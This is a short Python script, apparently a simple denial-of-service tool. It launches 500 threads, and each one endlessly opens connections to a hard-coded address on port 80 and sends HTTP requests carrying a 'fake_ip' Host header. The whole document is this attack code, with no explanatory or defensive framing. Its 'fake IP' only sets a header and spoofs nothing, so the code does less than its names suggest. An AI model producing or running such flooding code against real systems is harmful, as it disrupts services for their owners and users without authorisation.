import threading
import socket

target = '192.168.0.101'
port = 80
fake_ip = '192.168.0.102'

def ddos():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto((f'get /{target} HTTP/1.1\r\n').encode('ascii'), (target, port))
        s.sendto((f'Host: {fake_ip}\r\n\r\n').encode('ascii'), (target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=ddos)
    thread.start()